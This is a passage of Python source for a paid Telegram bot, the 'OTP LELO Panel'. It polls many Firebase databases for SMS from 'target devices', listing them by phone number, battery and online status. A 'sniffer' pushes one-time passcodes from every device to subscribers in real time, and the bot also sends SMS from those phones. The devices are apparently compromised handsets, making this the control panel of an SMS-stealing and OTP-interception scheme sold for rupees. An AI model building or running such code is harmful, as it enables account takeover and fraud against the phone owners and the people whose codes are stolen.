        pause_count = user.get("pause_count", 0)  
        used = pause_count if pause_date == today else 0  
        return {  
            "is_paused": user.get("paused", False),  
            "used_today": used,  
            "remaining_today": self.config.MAX_PAUSES_PER_DAY - used,  
        }  
      
    async def toggle_favorite(self, uid: int, device_key: str) -> Tuple[bool, str]:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if not user:  
                return False, "User not found"  
              
            favorites = user.get("favorites", [])  
            if not isinstance(favorites, list):  
                favorites = []  
            if device_key in favorites:  
                favorites.remove(device_key)  
                user["favorites"] = favorites  
                await self.firebase.save_user_data(uid, user)  
                return False, "❌ Removed from favorites"  
            else:  
                favorites.append(device_key)  
                user["favorites"] = favorites  
                await self.firebase.save_user_data(uid, user)  
                return True, "⭐ Added to favorites!"  
      
    @staticmethod  
    def _format_duration(seconds: int) -> str:  
        if seconds <= 0:  
            return "❌ Expired"  
        days = seconds // 86400  
        hours = (seconds % 86400) // 3600  
        minutes = (seconds % 3600) // 60  
        parts = []  
        if days > 0:  
            parts.append(f"{days}d")  
        if hours > 0:  
            parts.append(f"{hours}h")  
        if minutes > 0 or not parts:  
            parts.append(f"{minutes}m")  
        return " ".join(parts)

class ChannelService:
    def __init__(self, config: BotConfig):  
        self.config = config  
        self.cache = TTLCache(ttl=config.CHANNEL_CACHE_TTL)  
      
    async def is_member(self, app: Application, uid: int) -> bool:  
        if uid == self.config.OWNER_ID:  
            return True  
        cached = await self.cache.get(str(uid))  
        if cached is not None:  
            return cached  
        try:  
            member = await app.bot.get_chat_member(  
                self.config.CHANNEL_USERNAME,  
                uid,  
            )  
            is_member = member.status not in ("left", "kicked", "banned")  
            await self.cache.set(str(uid), is_member)  
            return is_member  
        except Exception:  
            return True
      
    async def force_check(self, app: Application, uid: int) -> bool:  
        await self.cache.invalidate(str(uid))  
        return await self.is_member(app, uid)

# ============================================================================
# Centralized SMS Polling & Instant Zero-OOM Sniffer Service
# ============================================================================

class SMSPollingService:
    def __init__(self, config: BotConfig, firebase: FirebaseService):  
        self.config = config  
        self.firebase = firebase  
        self._active_tasks: Dict[int, asyncio.Task] = {}  
        self._polling_lock = asyncio.Lock()  
        
        # Centralized Sniffer State
        self.active_sniffer_users: Set[int] = set()
        self._global_sniffer_task: Optional[asyncio.Task] = None
        self._device_last_sms_ids: Dict[str, int] = {}
        self._sniffer_started_at: float = 0.0

    async def start(  
        self,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        session: UserSession,  
        short_key: str,  
    ) -> None:  
        await self.stop(uid)  
        info = session.device_full_data.get(short_key)  
        if not info:  
            return  
          
        url = info.get("_src_url")  
        did = info.get("_original_did")  
        session.active_device = (url, did)  
        session.device_key = short_key  
        session.touch_session()
          
        try:
            msgs, is_err = await self.firebase.http.get(url, f"messages/{did}", query_params='orderBy="$key"&limitToLast=10')
            if not is_err and isinstance(msgs, dict):
                session.last_sms_id = max(
                    (int(re.sub(r'[^\d]', '', str(sms.get("id") or sms.get("timestamp") or k))) 
                     for k, sms in msgs.items() 
                     if isinstance(sms, dict) and re.sub(r'[^\d]', '', str(sms.get("id") or sms.get("timestamp") or k))),
                    default=0,
                )
        except Exception:  
            pass  
          
        task = asyncio.create_task(  
            self._poll_loop(context, uid, session, url, did),  
            name=f"sms_poll_{uid}",  
        )  
        self._active_tasks[uid] = task  
        session.poll_task = task  
      
    async def stop(self, uid: int) -> None:  
        async with self._polling_lock:  
            task = self._active_tasks.pop(uid, None)  
            if task and not task.done():  
                task.cancel()  
      
    async def stop_all(self) -> None:  
        for uid in list(self._active_tasks.keys()):  
            await self.stop(uid)  
        self.stop_all_sniffers()
      
    async def _poll_loop(  
        self,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        session: UserSession,  
        url: str,  
        did: str,  
    ) -> None:  
        consecutive_errors = 0  
        try:  
            while session.active_device == (url, did):  
                if session.is_device_session_expired():  
                    try:  
                        await safe_send_message(  
                            context,  
                            uid,  
                            "⌛ <b>Device Session Expired!</b>\nYour 10-minute hold has ended. Please pick a number again.",  
                            reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                        )  
                    except Exception:  
                        pass  
                    break  

                try:  
                    msgs, is_err = await self.firebase.http.get(
                        url, f"messages/{did}", query_params='orderBy="$key"&limitToLast=5'
                    )  
                    if not is_err and isinstance(msgs, dict):  
                        new_msgs = []
                        for k, sms in msgs.items():
                            if isinstance(sms, dict):
                                sms_id_val = sms.get("id") or sms.get("timestamp") or k
                                num_id = int(re.sub(r"[^\d]", "", str(sms_id_val))) if re.sub(r"[^\d]", "", str(sms_id_val)) else 0
                                if num_id > session.last_sms_id:
                                    sms["_calc_id"] = num_id
                                    new_msgs.append(sms)
                          
                        if new_msgs:  
                            new_msgs.sort(key=lambda x: x.get("_calc_id", 0))  
                            session.last_sms_id = new_msgs[-1]["_calc_id"]  
                            for sms in new_msgs:  
                                info = session.device_full_data.get(session.device_key or "", {})
                                phone = info.get("_phone") or await self.firebase.get_device_phone(url, did)
                                await self._send_notification(context, uid, sms, target_phone=phone)  
                    consecutive_errors = 0  
                except asyncio.CancelledError:  
                    raise  
                except Exception:  
                    consecutive_errors += 1  
                    if consecutive_errors >= self.config.SMS_POLL_MAX_ERRORS:  
                        break  
                    await asyncio.sleep(min(0.5 * consecutive_errors, 2.5))  
                  
                await asyncio.sleep(self.config.POLL_INTERVAL)  
        except asyncio.CancelledError:  
            pass  
        finally:  
            session.active_device = None  
            session.device_key = None  
            self._active_tasks.pop(uid, None)  
      
    async def _send_notification(  
        self,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        sms: Dict,  
        target_phone: Optional[str] = None,  
    ) -> None:  
        try:  
            message = str(sms.get("message") or sms.get("text") or sms.get("msg") or "").strip()
            if not message:
                return  

            formatted = OTPExtractor.format_html_message(message)  
            sender = escape(str(sms.get("sender") or sms.get("from") or "Unknown"))  
            
            device_display = escape(str(target_phone)) if target_phone else "Unknown"
            device_line = f"📱 <b>Device:</b> <code>{device_display}</code>\n"  
            text = f"📩 <b>New SMS Received!</b>\n{device_line}├ From: <code>{sender}</code>\n└ {formatted}"  
            
            await safe_send_message(  
                context,  
                uid,  
                text,  
                reply_markup=KeyboardBuilder.get_reply_keyboard(),  
            )  
        except Exception as e:  
            logger.error("Error sending SMS notification: %s", e)  

    def toggle_sniffer(self, context: ContextTypes.DEFAULT_TYPE, uid: int) -> bool:  
        if uid in self.active_sniffer_users:
            self.active_sniffer_users.discard(uid)
            if not self.active_sniffer_users and self._global_sniffer_task:
                self._global_sniffer_task.cancel()
                self._global_sniffer_task = None
                self._device_last_sms_ids.clear()
            return False
        else:
            self.active_sniffer_users.add(uid)
            if not self._global_sniffer_task or self._global_sniffer_task.done():
                self._sniffer_started_at = time.time()
                self._global_sniffer_task = asyncio.create_task(
                    self._central_sniffer_worker(context),
                    name="central_sniffer_worker"
                )
            return True

    def stop_all_sniffers(self) -> None:  
        self.active_sniffer_users.clear()
        if self._global_sniffer_task and not self._global_sniffer_task.done():
            self._global_sniffer_task.cancel()
            self._global_sniffer_task = None
        self._device_last_sms_ids.clear()

    async def _central_sniffer_worker(self, context: ContextTypes.DEFAULT_TYPE) -> None:
        """
        Polls each online/active target device in real time, delivering OTPs instantly.
        """
        try:
            clients = await self.firebase.get_all_clients(force_refresh=True)

            async def seed_device(url: str, did: str, dev_id_key: str):
                try:
                    msgs, is_err = await self.firebase.http.get(
                        url, f"messages/{did}", query_params='orderBy="$key"&limitToLast=5'
                    )
                    if not is_err and isinstance(msgs, dict):
                        max_id = max(
                            (int(re.sub(r"[^\d]", "", str(sms.get("id") or sms.get("timestamp") or k))) 
                             for k, sms in msgs.items() 
                             if isinstance(sms, dict) and re.sub(r"[^\d]", "", str(sms.get("id") or sms.get("timestamp") or k))),
                            default=0
                        )
                        self._device_last_sms_ids[dev_id_key] = max_id
                    else:
                        self._device_last_sms_ids[dev_id_key] = 0
                except Exception:
                    self._device_last_sms_ids[dev_id_key] = 0

            seed_tasks = []
            for dev_key, dev_info in clients.items():
                url = dev_info.get("_src_url")
                did = dev_info.get("_original_did")
                if url and did:
                    dev_id_key = f"{url}|{did}"
                    seed_tasks.append(seed_device(url, did, dev_id_key))

            if seed_tasks:
                await asyncio.gather(*seed_tasks, return_exceptions=True)

            last_device_refresh = time.monotonic()

            while self.active_sniffer_users:
                if time.monotonic() - last_device_refresh > 12.0:
                    clients = await self.firebase.get_all_clients(force_refresh=False)
                    last_device_refresh = time.monotonic()

                active_targets = [
                    (v.get("_src_url"), v.get("_original_did"), v.get("_phone"))
                    for v in clients.values()
                    if v.get("_is_online") and v.get("_src_url") and v.get("_original_did")
                ]
                if not active_targets:
                    active_targets = [
                        (v.get("_src_url"), v.get("_original_did"), v.get("_phone"))
                        for v in clients.values()
                        if v.get("_src_url") and v.get("_original_did")
                    ]

                async def poll_device_target(url: str, did: str, phone: Optional[str]):
                    if not self.active_sniffer_users:
                        return
                    dev_id_key = f"{url}|{did}"
                    last_seen_id = self._device_last_sms_ids.get(dev_id_key, None)

                    try:
                        msgs, is_err = await self.firebase.http.get(
                            url, f"messages/{did}", query_params='orderBy="$key"&limitToLast=5'
                        )
                        if is_err or not isinstance(msgs, dict):
                            return

                        if last_seen_id is None:
                            curr_max = max(
                                (int(re.sub(r"[^\d]", "", str(sms.get("id") or sms.get("timestamp") or k))) 
                                 for k, sms in msgs.items() 
                                 if isinstance(sms, dict) and re.sub(r"[^\d]", "", str(sms.get("id") or sms.get("timestamp") or k))),
                                default=0
                            )
                            self._device_last_sms_ids[dev_id_key] = curr_max
                            return

                        new_msgs = []
                        for k, sms in msgs.items():
                            if isinstance(sms, dict):
                                msg_body = str(sms.get("message") or sms.get("text") or sms.get("msg") or "").strip()
                                if not msg_body:
                                    continue
                                
                                sms_id_val = sms.get("id") or sms.get("timestamp") or k
                                num_id = int(re.sub(r"[^\d]", "", str(sms_id_val))) if re.sub(r"[^\d]", "", str(sms_id_val)) else 0
                                
                                if num_id > last_seen_id:
                                    sms["_calc_id"] = num_id
                                    new_msgs.append(sms)

                        if new_msgs:
                            new_msgs.sort(key=lambda x: x.get("_calc_id", 0))
                            self._device_last_sms_ids[dev_id_key] = new_msgs[-1]["_calc_id"]
                            
                            target_phone = phone or await self.firebase.get_device_phone(url, did)
                            for sms in new_msgs:
                                for sub_uid in list(self.active_sniffer_users):
                                    await self._send_notification(context, sub_uid, sms, target_phone=target_phone)

                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        pass

                await asyncio.gather(*[poll_device_target(u, d, p) for u, d, p in active_targets], return_exceptions=True)
                await asyncio.sleep(self.config.SNIFFER_INTERVAL)

        except asyncio.CancelledError:
            pass
        finally:
            self._global_sniffer_task = None
            self._device_last_sms_ids.clear()

# ============================================================================
# Keyboard Builder
# ============================================================================

class KeyboardBuilder:
    @staticmethod  
    def main_menu(  
        uid: int,  
        is_paused: bool,  
        remaining_pauses: int,  
        online_devices: List[Tuple[str, Dict]],  
        offline_devices: List[Tuple[str, Dict]],  
        page: int,  
        total_pages: int,  
        duplicate_count: int = 0,
    ) -> InlineKeyboardMarkup:  
        keyboard = [  
            [  
                InlineKeyboardButton(f"🟢 ONLINE ({len(online_devices)})", callback_data="noop"),  
                InlineKeyboardButton(f"🔴 OFFLINE ({len(offline_devices)})", callback_data="noop"),  
            ]  
        ]  
        start_idx = page * BotConfig.DEVICES_PER_PAGE  
        end_idx = min(  
            start_idx + BotConfig.DEVICES_PER_PAGE,  
            max(len(online_devices), len(offline_devices)),  
        )  
          
        for i in range(start_idx, end_idx):  
            row = []  
            if i < len(online_devices):  
                key, info = online_devices[i]  
                phone = info.get("_phone", key[:8])  
                battery = info.get("battery", "?")  
                row.append(InlineKeyboardButton(f"{phone} | 🔋{battery}", callback_data=f"sel_{key}"))  
            else:  
                row.append(InlineKeyboardButton(" ", callback_data="noop"))  
              
            if i < len(offline_devices):  
                key, info = offline_devices[i]  
                phone = info.get("_phone", key[:8])  
                row.append(InlineKeyboardButton(phone, callback_data=f"sel_{key}"))  
            else:  
                row.append(InlineKeyboardButton(" ", callback_data="noop"))  
            keyboard.append(row)  
          
        pag_buttons = []  
        if page > 0:  
            pag_buttons.append(InlineKeyboardButton("⏮️", callback_data="page_0"))  
            pag_buttons.append(InlineKeyboardButton("◀️", callback_data=f"page_{page-1}"))  
        if page < total_pages - 1:  
            pag_buttons.append(InlineKeyboardButton("▶️", callback_data=f"page_{page+1}"))  
            pag_buttons.append(InlineKeyboardButton("⏭️", callback_data=f"page_{total_pages-1}"))  
        if pag_buttons:  
            keyboard.append(pag_buttons)  
          
        keyboard.append([  
            InlineKeyboardButton(f"📄 Page {page+1}/{total_pages} (Tap to jump)", callback_data="jump_page")  
        ])  
        
        keyboard.append([  
            InlineKeyboardButton("🔍 Search Target Number", callback_data="search_device")  
        ])  

        if duplicate_count > 0:
            keyboard.append([  
                InlineKeyboardButton(f"📑 View Duplicate Numbers ({duplicate_count})", callback_data="view_duplicates")  
            ])  
          
        if is_paused:  
            keyboard.append([InlineKeyboardButton("▶️ Resume Timer", callback_data=f"resume_{uid}")])  
        else:  
            keyboard.append([InlineKeyboardButton("⏸️ Pause Timer", callback_data=f"pause_{uid}")])  
          
        keyboard.append([  
            InlineKeyboardButton(f"⏸️ Pauses: {remaining_pauses} left", callback_data="noop"),  
            InlineKeyboardButton(f"📊 Unique: {len(online_devices)+len(offline_devices)}", callback_data="noop"),  
        ])  
        return InlineKeyboardMarkup(keyboard)  
      
    @staticmethod  
    def device_menu(key: str, is_favorite: bool = False) -> InlineKeyboardMarkup:  
        fav_text = "⭐ Remove Favorite" if is_favorite else "⭐ Add Favorite"  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("📤 Send SMS", callback_data=f"send_{key}")],  
            [InlineKeyboardButton("📩 SMS History", callback_data=f"sms_{key}")],  
            [InlineKeyboardButton(fav_text, callback_data=f"fav_{key}")],  
            [InlineKeyboardButton("🔄 Refresh 10m Session", callback_data=f"refresh_sess_{key}")],  
            [InlineKeyboardButton("🔙 Back to Numbers", callback_data="back_main")],  
        ])  
      
    @staticmethod  
    def sms_history_menu(key: str) -> InlineKeyboardMarkup:  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel_{key}")],  
            [InlineKeyboardButton("🏠 Main Numbers", callback_data="back_main")],  
        ])  
      
    @staticmethod  
    def back_to_device_menu(key: str) -> InlineKeyboardMarkup:  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel_{key}")]  
        ])  

    @staticmethod  
    def back_to_main_button() -> InlineKeyboardMarkup:  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("🔙 Back to Numbers", callback_data="back_main")]  
        ])  
      
    @staticmethod  
    def channel_gate() -> InlineKeyboardMarkup:  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{BotConfig.CHANNEL_USERNAME.lstrip('@')}")],  
            [InlineKeyboardButton("✅ Verify Join", callback_data="verify_channel")],  
            [InlineKeyboardButton("🔄 Force Check", callback_data="force_check")],  
        ])  
      
    @staticmethod  
    def referral(uid: int) -> InlineKeyboardMarkup:  
        ref_link = f"https://t.me/{BotConfig.BOT_USERNAME}?start=ref_{uid}"  
        return InlineKeyboardMarkup([  
            [InlineKeyboardButton("🔗 Copy Link", callback_data=f"copy_ref_{uid}")],  
            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}")],  
        ])  

    @staticmethod  
    def duplicates_menu(
        duplicates: List[Tuple[str, Dict]], 
        page: int = 0, 
        total_pages: int = 1,
        is_owner: bool = False
    ) -> InlineKeyboardMarkup:  
        keyboard = []  
        start_idx = page * BotConfig.DEVICES_PER_PAGE  
        end_idx = min(start_idx + BotConfig.DEVICES_PER_PAGE, len(duplicates))  
        
        for i in range(start_idx, end_idx):  
            key, info = duplicates[i]  
            phone = info.get("_phone", "Unknown")  
            status = "🟢" if info.get("_is_online") else "🔴"
            
            if is_owner:
                src = info.get("_src_url", "").replace("https://", "").split(".")[0]
                label = f"{status} {phone} ({src})"
            else:
                battery = info.get("battery", "?")
                label = f"{status} {phone} | 🔋{battery}"

            keyboard.append([InlineKeyboardButton(label, callback_data=f"sel_{key}")])  
        
        pag_buttons = []  
        if page > 0:  
            pag_buttons.append(InlineKeyboardButton("◀️", callback_data=f"dup_page_{page-1}"))  
        if page < total_pages - 1:  
            pag_buttons.append(InlineKeyboardButton("▶️", callback_data=f"dup_page_{page+1}"))  
        if pag_buttons:  
            keyboard.append(pag_buttons)  
        
        keyboard.append([InlineKeyboardButton(f"📄 Page {page+1}/{total_pages}", callback_data="noop")])  
        keyboard.append([InlineKeyboardButton("🔙 Back to Numbers", callback_data="back_main")])  
        return InlineKeyboardMarkup(keyboard)  

    @staticmethod  
    def favorites_menu(favorites: List[Dict], page: int = 0, total_pages: int = 1) -> InlineKeyboardMarkup:  
        keyboard = []  
        start_idx = page * BotConfig.DEVICES_PER_PAGE  
        end_idx = min(start_idx + BotConfig.DEVICES_PER_PAGE, len(favorites))  
        
        for i in range(start_idx, end_idx):  
            fav = favorites[i]  
            phone = fav.get("phone", "Unknown")  
            key = fav.get("key", "")  
            keyboard.append([InlineKeyboardButton(f"📱 {phone}", callback_data=f"sel_{key}")])  
        
        pag_buttons = []  
        if page > 0:  
            pag_buttons.append(InlineKeyboardButton("◀️", callback_data=f"fav_page_{page-1}"))  
        if page < total_pages - 1:  
            pag_buttons.append(InlineKeyboardButton("▶️", callback_data=f"fav_page_{page+1}"))  
        if pag_buttons:  
            keyboard.append(pag_buttons)  
        
        keyboard.append([InlineKeyboardButton(f"📄 Page {page+1}/{total_pages}", callback_data="noop")])  
        keyboard.append([InlineKeyboardButton("🔙 Back to Main Numbers", callback_data="back_main")])  
        return InlineKeyboardMarkup(keyboard)  

    @staticmethod  
    def get_reply_keyboard() -> ReplyKeyboardMarkup:  
        keyboard = [  
            [KeyboardButton("📱 Show Numbers Menu"), KeyboardButton("🎲 Random Online Number")],  
            [KeyboardButton("🔍 Ultimate Sniffer"), KeyboardButton("⭐ Favorites")],  
            [KeyboardButton("📑 Duplicate Numbers"), KeyboardButton("🆘 Help")]  
        ]  
        return ReplyKeyboardMarkup(  
            keyboard,  
            resize_keyboard=True,  
            is_persistent=True,  
        )

# ============================================================================
# Bot Handlers
# ============================================================================

class BotHandlers:
    def __init__(  
        self,  
        config: BotConfig,  
        firebase: FirebaseService,  
        user_service: UserService,  
        channel_service: ChannelService,  
        sms_service: SMSPollingService,  
    ):  
        self.config = config  
        self.firebase = firebase  
        self.user_service = user_service  
        self.channel_service = channel_service  
        self.sms_service = sms_service  
        self._user_sessions: Dict[int, UserSession] = {}  
        self.admin_panel: Optional[AdminPanel] = None  
      
    def get_session(self, uid: int) -> UserSession:  
        if uid not in self._user_sessions:  
            self._user_sessions[uid] = UserSession(user_id=uid)  
        return self._user_sessions[uid]  
      
    async def cleanup_inactive_sessions(self) -> None:  
        now = time.time()  
        inactive_uids = [  
            uid for uid, session in self._user_sessions.items()  
            if now - session.last_activity > 300  
        ]  
        for uid in inactive_uids:  
            session = self._user_sessions.pop(uid, None)  
            if session:  
                session.cancel_tasks()  
                session.device_full_data.clear()
        gc.collect()

    def _clear_pending_interactive_states(self, context: ContextTypes.DEFAULT_TYPE) -> None:  
        context.user_data.pop("awaiting_jump_page", None)  
        context.user_data.pop("awaiting_search_device", None)  
        context.user_data.pop("awaiting_utr", None)  
        context.user_data.pop("sms_recipient", None)  
        context.user_data.pop("device_key", None)  
        context.user_data.pop("sms_conversation_active", None)  

    async def _run_device_countdown(  
        self,  
        context: ContextTypes.DEFAULT_TYPE,  
        chat_id: int,  
        msg_id: int,  
        uid: int,  
        key: str,  
    ) -> None:  
        session = self.get_session(uid)  
        info = session.device_full_data.get(key, {})  
        phone = info.get("_phone", "Unknown")  
        battery = info.get("battery", "N/A")  
        status = "🟢 Online" if info.get("_is_online") else "🔴 Offline"  

        try:  
            while session.device_key == key and session.device_card_msg_id == msg_id and not session.is_in_subfunction:  
                rem_time = session.get_remaining_session_seconds()  
                favorites = await self.firebase.get_user_favorites(uid)  
                if rem_time <= 0:  
                    expired_text = (  
                        f"📱 <b>Device Info</b>\n"  
                        f"├ Number: <code>{escape(phone)}</code>\n"  
                        f"├ Battery: <code>{escape(battery)}</code>\n"  
                        f"├ Status: {status}\n"  
                        f"└ ⏳ Session: <code>0 sec left (Expired)</code>"  
                    )  
                    await safe_edit_message(  
                        context,  
                        chat_id,  
                        msg_id,  
                        expired_text,  
                        reply_markup=KeyboardBuilder.device_menu(key, key in favorites),  
                    )  
                    break  

                text = (  
                    f"📱 <b>Device Info</b>\n"  
                    f"├ Number: <code>{escape(phone)}</code>\n"  
                    f"├ Battery: <code>{escape(battery)}</code>\n"  
                    f"├ Status: {status}\n"  
                    f"└ ⏳ Session: <code>{rem_time} sec left</code>"  
                )  

                success = await safe_edit_message(  
                    context,  
                    chat_id,  
                    msg_id,  
                    text,  
                    reply_markup=KeyboardBuilder.device_menu(key, key in favorites),  
                )  
                if not success:  
                    break  

                sleep_duration = 4.0 if rem_time <= 30 else 10.0  
                await asyncio.sleep(sleep_duration)  

        except asyncio.CancelledError:  
            pass  
        except Exception:  
            pass  

    def _split_devices(  
        self,  
        clients: Dict[str, Dict]  
    ) -> Tuple[List[Tuple[str, Dict]], List[Tuple[str, Dict]], List[Tuple[str, Dict]]]:  
        phone_buckets: Dict[str, List[Tuple[str, Dict]]] = {}
        for key, info in clients.items():
            if not isinstance(info, dict):
                continue
            phone = str(info.get("_phone", key))
            if phone not in phone_buckets:
                phone_buckets[phone] = []
            phone_buckets[phone].append((key, info))

        unique_online, unique_offline, duplicates = [], [], []

        for phone, items in phone_buckets.items():
            if len(items) > 1:
                duplicates.extend(items)
            else:
                key, info = items[0]
                if info.get("_is_online"):
                    unique_online.append((key, info))
                else:
                    unique_offline.append((key, info))

        unique_online.sort(key=lambda x: x[1].get("_last_sms_time", 0), reverse=True)  
        unique_offline.sort(key=lambda x: x[1].get("_last_sms_time", 0), reverse=True)  
        duplicates.sort(key=lambda x: x[1].get("_last_sms_time", 0), reverse=True)
        return unique_online, unique_offline, duplicates  

    # ---- Command Handlers ----  
      
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        try:  
            self._clear_pending_interactive_states(context)  
            user = update.effective_user  
            uid = user.id  
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()  
            username = user.username or ""  
              
            session = self.get_session(uid)  
            session.update_activity()  

            # ── Ban Check ──
            if uid != self.config.OWNER_ID and self.admin_panel and self.admin_panel.is_banned(uid):
                banned = self.admin_panel.load_banned()
                entry = banned.get(str(uid), {})
                reason = entry.get("reason", "Violation of terms")
                await safe_send_message(
                    context,
                    update.effective_chat.id,
                    f"🚫 <b>ACCESS DENIED</b>\n\nYou have been banned from using this bot.\n\n<b>Reason:</b> {escape(reason)}\n\nContact @zvxay_papa for appeals.",
                )
                return
              
            referrer_id = None  
            if context.args and context.args[0].startswith("ref_"):  
                try:  
                    referrer_id = int(context.args[0][4:])  
                    if referrer_id != uid:  
                        context.user_data["pending_referrer_id"] = referrer_id  
                except ValueError:  
                    pass  
              
            if not referrer_id:  
                referrer_id = context.user_data.get("pending_referrer_id")  
              
            if uid != self.config.OWNER_ID:  
                if not await self.channel_service.force_check(context.application, uid):  
                    await safe_send_message(  
                        context,  
                        update.effective_chat.id,  
                        f"🚫 <b>Access Restricted</b>\n\n"  
                        f"👋 Welcome <b>{escape(name)}</b>!\n"  
                        f"Please join our channel {escape(self.config.CHANNEL_USERNAME)} to use this bot.\n\n"  
                        f"🔄 Click 'Verify Join' after joining.",  
                        reply_markup=KeyboardBuilder.channel_gate(),  
                    )  
                    return  
              
            existing_user = await self.firebase.get_user_data(uid)  
            await self.user_service.get_or_create(uid, name, username, referrer_id)  
              
            if not existing_user and referrer_id and referrer_id != uid:  
                context.user_data.pop("pending_referrer_id", None)  
                asyncio.create_task(  
                    self.user_service.process_referral(referrer_id, uid, name, context.application)  
                )  

            user_data = await self.firebase.get_user_data(uid)  
            if user_data and user_data.get("paused", False):  
                frozen = user_data.get("frozen_seconds", 0)  
                if frozen > 0:  
                    now = int(time.time())  
                    user_data["valid_until"] = now + frozen  
                    user_data["paused"] = False  
                    user_data["frozen_seconds"] = 0  
                    await self.firebase.save_user_data(uid, user_data)  
              
            session.current_page = 0  
            session.reset_device_state()  
            session.update_activity()  
            
            asyncio.create_task(self.firebase.get_all_clients(session, force_refresh=False))  

            validity = await self.user_service.get_validity_text(uid)  
            pause_info = await self.user_service.get_pause_info(uid)  
            remaining_pauses = pause_info["remaining_today"] if pause_info else 0  
            uname_text = f"@{escape(username)}" if username else "No Username"  

            greeting = (  
                f"🔥 <b>Welcome to OTP LELO Panel</b>\n"  
                f"━━━━━━━━━━━━━━━━━━━━━\n"  
                f"👤 <b>User:</b> <code>{escape(name)}</code> ({uname_text})\n"  
                f"🆔 <b>User ID:</b> <code>{uid}</code>\n"  
                f"⏳ <b>Validity:</b> {escape(validity)}\n"  
                f"⏸️ <b>Pauses:</b> {remaining_pauses} left today\n\n"  
                f"⚡ <b>How to use:</b>\n"  
                f"• Tap <b>📱 Show Numbers Menu</b> to browse unique target devices\n"  
                f"• Tap <b>🎲 Random Online Number</b> to instantly get an active device\n"  
                f"• Tap <b>🔍 Ultimate Sniffer</b> to receive OTPs from all devices live\n"  
                f"• Tap <b>📑 Duplicate Numbers</b> to inspect duplicate entries"  
            )  

            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                greeting,  
                reply_markup=KeyboardBuilder.get_reply_keyboard(),  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  

        except Exception as e:  
            logger.exception("Start command error: %s", e)  

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        try:  
            self._clear_pending_interactive_states(context)  
            text = (  
                f"ℹ️ <b>Help & Information Guide</b>\n"  
                f"━━━━━━━━━━━━━━━━━━━━━\n"  
                f"👑 <b>Owner:</b> @zvxay_papa\n"  
                f"📢 <b>Channel:</b> {escape(self.config.CHANNEL_USERNAME)}\n\n"  
                f"📖 <b>Features Guide:</b>\n\n"  
                f"📱 <b>Show Numbers Menu:</b> Browse all unique targets.\n"  
                f"🎲 <b>Random Online Number:</b> Instant online device reservation.\n"  
                f"🔍 <b>Ultimate Sniffer:</b> Central real-time OTP interceptor.\n"  
                f"📑 <b>Duplicate Numbers:</b> View numbers present on multiple nodes.\n"  
                f"⭐ <b>Favorites:</b> Bookmark favorite endpoints.\n\n"  
                f"━━━━━━━━━━━━━━━━━━━━━\n"  
                f"🔹 /start — Main Menu\n"  
                f"🔹 /buy — Purchase subscription\n"  
                f"🔹 /refer — Invite friends to get +4 hours"  
            )  
            await safe_send_message(  
                context,  
                update.effective_chat.id,  
                text,  
                reply_markup=KeyboardBuilder.get_reply_keyboard(),  
            )  
        except Exception as e:  
            logger.exception("Help command error: %s", e)  
      
    async def cmd_buy(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        try:  
            self._clear_pending_interactive_states(context)  
            user = update.effective_user  
            uid = user.id  
            if uid != self.config.OWNER_ID:  
                if not await self.channel_service.is_member(context.application, uid):  
                    await safe_send_message(context, update.effective_chat.id, "🚫 Please join our channel first using /start", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                    return  
              
            if not context.args:  
                await safe_send_message(  
                    context,  
                    update.effective_chat.id,  
                    "❌ <b>Invalid usage!</b>\n\n"  
                    "Please specify duration: <code>/buy 10d</code>, <code>/buy 3m</code>, <code>/buy 1y</code>",  
                    reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                )  
                return  
              
            duration_arg = context.args[0].lower()  
            match = re.match(r"^(\d+)([dmy])$", duration_arg)  
            if not match:  
                await safe_send_message(  
                    context,  
                    update.effective_chat.id,  
                    "❌ <b>Invalid format!</b> Use: <code>/buy 10d</code>, <code>/buy 1m</code>, <code>/buy 1y</code>",  
                    reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                )  
                return  
              
            val = int(match.group(1))  
            unit = match.group(2)  
            if unit == "d":  
                total_days = val  
                duration_text = f"{val} Day(s)"  
            elif unit == "m":  
                total_days = val * 30  
                duration_text = f"{val} Month(s)"  
            elif unit == "y":  
                total_days = val * 365  
                duration_text = f"{val} Year(s)"  
            else:  
                total_days = val  
                duration_text = f"{val} Day(s)"  
              
            total_amount = total_days * self.config.PRICE_PER_DAY  
            context.user_data["pending_buy_duration_seconds"] = total_days * 86400  
            context.user_data["pending_buy_duration_text"] = duration_text  
            context.user_data["pending_buy_amount"] = total_amount  
              
            text = (  
                f"🛒 <b>Purchase Subscription</b>\n"  
                f"━━━━━━━━━━━━━━━\n"  
                f"📦 <b>Plan:</b> {escape(duration_text)}\n"  
                f"💰 <b>Amount to Pay:</b> ₹{total_amount}\n"  
                f"🏦 <b>UPI ID:</b> <code>{escape(self.config.UPI_ID)}</code>\n"  
                f"━━━━━━━━━━━━━━━\n"  
                f"1️⃣ Send <b>₹{total_amount}</b> to the UPI ID above.\n"  
                f"2️⃣ Reply here with your <b>UTR / Transaction ID</b> to complete your order."  
            )  
            await safe_send_message(context, update.effective_chat.id, text, reply_markup=KeyboardBuilder.get_reply_keyboard())  
            context.user_data["awaiting_utr"] = True  
        except Exception as e:  
            logger.exception("Buy command error: %s", e)  

    async def handle_text_message(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> None:  
        try:  
            if not update.message or not update.message.text:  
                return  

            text = update.message.text.strip()  
            uid = update.effective_user.id  
